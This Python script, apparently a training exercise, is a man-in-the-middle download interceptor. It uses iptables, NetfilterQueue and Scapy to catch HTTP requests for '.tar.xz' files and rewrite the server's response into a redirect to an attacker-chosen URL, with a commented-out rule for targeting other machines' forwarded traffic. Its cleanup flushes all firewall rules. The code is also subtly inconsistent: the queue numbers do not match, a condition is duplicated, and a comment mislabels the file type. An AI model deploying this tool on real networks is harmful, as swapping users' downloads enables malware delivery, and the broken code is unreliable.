#!/usr/bin/env python
import argparse
import netfilterqueue
import scapy.all as scapy
import subprocess


def get_arguments():

    return 0


def create_queue():
    # targeting
    # subprocess.call('iptables -I FORWARD -j NFQUEUE --queue-num 1', shell=True)
    # local
    subprocess.call('iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
    subprocess.call('iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)


def remove_queue():
    subprocess.call('iptables --flush', shell=True)


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


ack_list = []


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:  # Leaving
            print('Req')
            if '.tar.xz' in scapy_packet[scapy.Raw].load or '.tar.xz' in scapy_packet[scapy.Raw].load:  # Download exe file.
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print('[+] exe Request')
        elif scapy_packet[scapy.TCP].sport == 80:  # Response
            print('Res')
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print('[+] Replacing file')
                modified_packet = set_load(scapy_packet,
                'HTTP/1.1 301 Moved Permanently\nLocation: http://cdn-10.nikon-cdn.com/pdf/manuals/dslr/D5100_EN.pdf\n\n')

                packet.set_payload(str(modified_packet))

    packet.accept()


args = get_arguments()

create_queue()
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(1, process_packet)
    queue.run()
except KeyboardInterrupt:
    print('\n[-] Detected CTRL + C ...... Resetting ip tables. Please wait ...')
    remove_queue()
